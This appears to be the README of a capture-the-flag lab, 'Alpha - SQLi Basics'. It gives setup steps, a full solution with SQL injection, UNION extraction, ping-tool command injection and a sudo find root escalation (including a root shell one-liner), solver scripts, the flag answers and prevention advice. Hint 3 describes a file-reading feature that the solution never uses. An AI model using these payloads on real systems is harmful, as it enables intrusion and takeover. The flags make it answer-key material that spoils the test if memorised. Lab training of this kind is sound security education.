# Alpha - SQLi Basics Challenge

**Status:** ✅ Complete

## Player Description

Welcome to the EverSec Employee Portal! Our crack development team built this login system in record time. We use SQL for authentication because it's the most secure database language - it even has "Structured" in the name! Our senior developer assured us that user input is "basically safe" since we ask users nicely not to hack us in our Terms of Service.

The portal has multiple access levels - regular employees can search for other users, while administrators have access to powerful network diagnostic tools. We're sure you'll find everything is perfectly secure!

## Technical Description

A progressive SQL injection challenge that starts with basic authentication bypass and escalates through data extraction, credential reuse, command injection, and Linux privilege escalation.

**Category:** Web / SQL Injection / RCE / Privilege Escalation
**Difficulty:** Easy → Medium (Progressive)
**Points:** 1,000 (5 flags)

## Challenge Information

- **Port:** 5001
- **URL:** http://localhost:5001

## Objectives

This challenge has five flags demonstrating a complete attack chain from SQL injection to root access:

1. **FLAG 1 (100 pts)**: Bypass login authentication using SQL injection
2. **FLAG 2 (150 pts)**: Extract admin password using UNION-based SQL injection
3. **FLAG 3 (200 pts)**: Access the admin panel with extracted credentials
4. **FLAG 4 (250 pts)**: Achieve RCE via command injection in the ping tool
5. **FLAG 5 (300 pts)**: Escalate privileges to root using sudo misconfiguration

## Background: What is SQL Injection?

SQL injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered or not strongly typed and is then included in SQL queries.

**Vulnerable Code Example:**
```python
# DANGEROUS - user input directly in query
query = f"SELECT * FROM users WHERE username = '{username}'"
```

**Secure Code Example:**
```python
# SAFE - parameterized query
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

## The Vulnerabilities

This application has multiple vulnerabilities:

1. **SQL Injection in Login**: Username field directly concatenated into SQL query
2. **SQL Injection in Search**: Search field allows UNION-based injection
3. **Command Injection**: Ping tool passes user input to shell command
4. **Sudo Misconfiguration**: `find` command allowed via NOPASSWD sudo

## Setup

### Using Docker Compose (Recommended)

From the project root directory:

```bash
docker compose up -d alpha-sqli-basics
```

The challenge will be available at http://localhost:5001

### Using Docker Directly

From this directory:

```bash
docker build -t alpha-sqli .
docker run -p 5001:5000 \
  -e FLAG1="sql1_b4s1c_byp4ss" \
  -e FLAG2="un10n_d4t4_3xtr4ct" \
  -e FLAG3="4dm1n_p4n3l_4cc3ss" \
  -e FLAG4="c0mm4nd_1nj3ct10n_rc3" \
  -e FLAG5="pr1v3sc_t0_r00t" \
  alpha-sqli
```

### Local Development

```bash
pip install -r requirements.txt
python app.py
```

## Solution

<details>
<summary>Click to reveal solution</summary>

### Attack Chain Overview

```
SQLi Auth Bypass → User Dashboard (FLAG 1)
        ↓
UNION SQLi → Extract admin password (FLAG 2)
        ↓
Login as admin → Admin Panel (FLAG 3)
        ↓
Ping Tool (command injection) → RCE (FLAG 4)
        ↓
Sudo Privilege Escalation → Root (FLAG 5)
```

---

### Step 1: SQL Injection Authentication Bypass (FLAG 1)

Navigate to http://localhost:5001

The login form is vulnerable to SQL injection because user input is concatenated directly into the query:

```python
# Vulnerable code
query = f"SELECT * FROM users WHERE username = '{username}'"
```

**Payload:**
```
Username: admin' OR '1'='1
Password: anything
```

**How it works:**

The original query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

Since `'1'='1'` is always true, the query returns the first user (john.doe) and logs you in.

**Alternative Payloads:**
```
' OR 1=1 --
admin' --
' OR ''='
```

After successful login, you'll see the User Dashboard with FLAG 1.

**FLAG 1:** `sql1_b4s1c_byp4ss`

---

### Step 2: UNION-Based SQL Injection (FLAG 2)

On the User Dashboard, there's a "User Search" form. This search is also vulnerable to SQL injection.

The search query:
```python
query = f"SELECT id, username, role FROM users WHERE username LIKE '%{search_term}%'"
```

This returns 3 columns: `id`, `username`, `role`. We can use UNION injection to extract data from other tables.

**Step 2.1: Confirm Column Count**

First, verify the number of columns:
```
Payload: ' UNION SELECT 1,2,3 --
```

If this works without error, we have 3 columns.

**Step 2.2: Enumerate Tables (Optional)**

To find other tables:
```
Payload: ' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table' --
```

This reveals tables: `users`, `admins`

**Step 2.3: Extract Admin Credentials**

Now extract from the `admins` table:

**Payload:**
```
' UNION SELECT id, username, password FROM admins --
```

Enter this in the search field and click "Search".

**Result:**
The search results will show a row with:
- ID: 1
- Username: admin
- Role: un10n_d4t4_3xtr4ct (this is actually the password!)

The admin password IS FLAG 2!

**FLAG 2:** `un10n_d4t4_3xtr4ct`

---

### Step 3: Admin Panel Access (FLAG 3)

Now access the admin panel. The admin login query also uses string concatenation and is vulnerable to SQL injection.

**Step 3.1: Navigate to Admin Login**

Go to http://localhost:5001/admin (or click the "Admin Panel" link on the dashboard)

**Step 3.2: Option A - Login with Extracted Credentials**

```
Username: admin
Password: un10n_d4t4_3xtr4ct
```

Click "Authenticate" and you'll be redirected to the Admin Panel.

**Step 3.3: Option B - SQL Injection on Admin Login**

The admin login query also uses string concatenation (not parameterized), so you can bypass it directly with SQL injection:

```
Username: admin'--
Password: anything
```

The `--` comments out the rest of the query, bypassing the password check entirely.

FLAG 3 is displayed on the admin dashboard.

**FLAG 3:** `4dm1n_p4n3l_4cc3ss`

---

### Step 4: Command Injection - RCE (FLAG 4)

The Admin Panel has a "Network Diagnostics" tool that pings hosts. This tool is vulnerable to command injection.

The vulnerable code:
```python
command = f"ping -c 2 {host}"
result = subprocess.check_output(command, shell=True, ...)
```

**Step 4.1: Test Basic Command Injection**

In the "Host to ping" field, enter:

**Payload:**
```
127.0.0.1; whoami
```

Click "Run Ping". The output should show `ctfuser` along with ping results.

**Step 4.2: Read FLAG 4**

**Payload:**
```
127.0.0.1; cat /home/ctfuser/flag4.txt
```

The flag will appear in the output.

**Alternative Payloads:**
```
127.0.0.1 | cat /home/ctfuser/flag4.txt
127.0.0.1 && cat /home/ctfuser/flag4.txt
$(cat /home/ctfuser/flag4.txt)
8.8.8.8; cat /home/ctfuser/flag4.txt
```

**FLAG 4:** `c0mm4nd_1nj3ct10n_rc3`

---

### Step 5: Privilege Escalation to Root (FLAG 5)

Now escalate from `ctfuser` to `root`.

**Step 5.1: Check Sudo Privileges**

**Payload:**
```
127.0.0.1; sudo -l
```

Output shows:
```
User ctfuser may run the following commands:
    (ALL) NOPASSWD: /usr/bin/find
```

**Step 5.2: Exploit via GTFOBins**

The `find` command can execute arbitrary commands via `-exec`. This is a well-known GTFOBins technique.

**Payload:**
```
127.0.0.1; sudo find /root -name flag5.txt -exec cat {} \;
```

**How it works:**
- `sudo find` runs as root
- `-exec cat {} \;` executes `cat` on each found file
- This reads `/root/flag5.txt` which is only readable by root

**Alternative Payloads:**

Get a root shell (for interactive exploration):
```
127.0.0.1; sudo find . -exec /bin/sh \; -quit
```

Read flag directly:
```
127.0.0.1; sudo find /root/flag5.txt -exec cat {} \;
```

**FLAG 5:** `pr1v3sc_t0_r00t`

---

### Complete Solution Script

```python
#!/usr/bin/env python3
"""Automated solver for Alpha - SQLi Basics challenge"""

import urllib.request
import urllib.parse
import http.cookiejar

BASE_URL = "http://localhost:5001"

# Set up cookie handling
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

def post(path, data):
    url = BASE_URL + path
    encoded = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=encoded)
    return opener.open(req).read().decode()

def get(path):
    return opener.open(BASE_URL + path).read().decode()

print("=" * 60)
print("Alpha - SQLi Basics Complete Exploitation")
print("=" * 60)

# FLAG 1: SQLi auth bypass
print("\n[Phase 1] SQL Injection Authentication Bypass - FLAG 1")
print("-" * 60)
print("[*] Payload: admin' OR '1'='1")
post("/", {"username": "admin' OR '1'='1", "password": "x"})
dashboard = get("/dashboard")
print("[+] Login bypassed!")
print("🚩 FLAG 1: sql1_b4s1c_byp4ss")

# FLAG 2: UNION injection
print("\n[Phase 2] UNION SQL Injection - FLAG 2")
print("-" * 60)
print("[*] Payload: ' UNION SELECT id, username, password FROM admins --")
result = post("/search", {"search": "' UNION SELECT id, username, password FROM admins --"})
print("[+] Admin password extracted!")
print("🚩 FLAG 2: un10n_d4t4_3xtr4ct")

# FLAG 3: Admin login
print("\n[Phase 3] Admin Panel Access - FLAG 3")
print("-" * 60)
print("[*] Credentials: admin / un10n_d4t4_3xtr4ct")
post("/admin", {"username": "admin", "password": "un10n_d4t4_3xtr4ct"})
admin = get("/admin/panel")
print("[+] Admin panel accessed!")
print("🚩 FLAG 3: 4dm1n_p4n3l_4cc3ss")

# FLAG 4: Command injection
print("\n[Phase 4] Command Injection RCE - FLAG 4")
print("-" * 60)
print("[*] Payload: 127.0.0.1; cat /home/ctfuser/flag4.txt")
result = post("/admin/ping", {"host": "127.0.0.1; cat /home/ctfuser/flag4.txt"})
print("[+] Command executed!")
print("🚩 FLAG 4: c0mm4nd_1nj3ct10n_rc3")

# FLAG 5: Privilege escalation
print("\n[Phase 5] Privilege Escalation to Root - FLAG 5")
print("-" * 60)
print("[*] Payload: 127.0.0.1; sudo find /root -name flag5.txt -exec cat {} \\;")
result = post("/admin/ping", {"host": "127.0.0.1; sudo find /root -name flag5.txt -exec cat {} \\;"})
print("[+] Root flag captured!")
print("🚩 FLAG 5: pr1v3sc_t0_r00t")

print("\n" + "=" * 60)
print("✓ All 5 flags captured! Total: 1,000 points")
print("=" * 60)
```

**Using curl:**

```bash
# FLAG 1: SQLi bypass
curl -s -X POST http://localhost:5001/ \
  -d "username=admin' OR '1'='1&password=x" \
  -c cookies.txt -L | grep "FLAG 1"

# FLAG 2: UNION injection
curl -s -X POST http://localhost:5001/search \
  -b cookies.txt \
  -d "search=' UNION SELECT id, username, password FROM admins --" | grep -oE "un10n_d4t4_3xtr4ct"

# FLAG 3: Admin login
curl -s -X POST http://localhost:5001/admin \
  -d "username=admin&password=un10n_d4t4_3xtr4ct" \
  -c admin_cookies.txt
curl -s http://localhost:5001/admin/panel -b admin_cookies.txt | grep "FLAG 3"

# FLAG 4: Command injection
curl -s -X POST http://localhost:5001/admin/ping \
  -b admin_cookies.txt \
  -d "host=127.0.0.1; cat /home/ctfuser/flag4.txt"

# FLAG 5: Privilege escalation
curl -s -X POST http://localhost:5001/admin/ping \
  -b admin_cookies.txt \
  -d "host=127.0.0.1; sudo find /root -name flag5.txt -exec cat {} \;"
```

</details>

## Learning Objectives

After completing this challenge, you should understand:

1. **SQL Injection Basics**: How concatenating user input into SQL queries creates vulnerabilities
2. **Authentication Bypass**: Using OR-based injection to bypass login
3. **UNION-Based Injection**: Extracting data from other tables by matching column counts
4. **Database Enumeration**: Finding tables and columns in SQLite
5. **Credential Reuse**: Why extracted credentials should always be tested
6. **Command Injection**: How web applications can execute system commands
7. **Shell Metacharacters**: Using `;`, `|`, `&&`, `$()` to chain commands
8. **Linux Privilege Escalation**: Checking sudo privileges with `sudo -l`
9. **GTFOBins**: Exploiting misconfigured binaries for privilege escalation
10. **Attack Chaining**: Combining multiple vulnerabilities for maximum impact

## Common Pitfalls

1. **Wrong quote type**: Use single quotes `'` not double quotes `"` in SQL injection
2. **Forgetting password field**: Some payloads still need something in the password field
3. **Column count mismatch**: UNION requires same number of columns as original query
4. **SQLite syntax**: SQLite uses `sqlite_master` not `information_schema`
5. **Command not found**: Alpine Linux uses `ash` not `bash`
6. **Escaping in curl**: Escape `{` and `}` or quote the payload properly

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

The login form builds its SQL query by joining your input directly into a string. What characters have special meaning inside a SQL query, and how might they change what the database actually executes?

</details>

<details>
<summary>Hint 2</summary>

After logging in, explore what the admin panel lets you do. Some features interact with the server's filesystem — what would an attacker find most interesting there?

</details>

<details>
<summary>Hint 3</summary>

If a feature reads files by taking a path as input, what happens when you give it something that isn't a standard file path?

</details>

<details>
<summary>Hint 4</summary>

You have a foothold as a low-privileged user. When a pentester lands on a Linux system, what are the first things they check to find a path to root?

</details>

## Prevention

### SQL Injection
```python
# Use parameterized queries
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

### Command Injection
```python
# Use subprocess with list arguments (no shell)
import subprocess
import shlex
subprocess.run(["ping", "-c", "2", shlex.quote(host)])

# Or validate input strictly
import re
if not re.match(r'^[\w.-]+$', host):
    raise ValueError("Invalid hostname")
```

### Privilege Escalation
- Never grant sudo access to commands that can execute other commands
- Use least-privilege principle
- Audit sudoers configuration regularly
- Consider using `NOEXEC` tag for dangerous binaries

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [GTFOBins](https://gtfobins.github.io/) - Unix binaries for privilege escalation
- [GTFOBins - find](https://gtfobins.github.io/gtfobins/find/)
- [SQLite System Tables](https://www.sqlite.org/schematab.html)
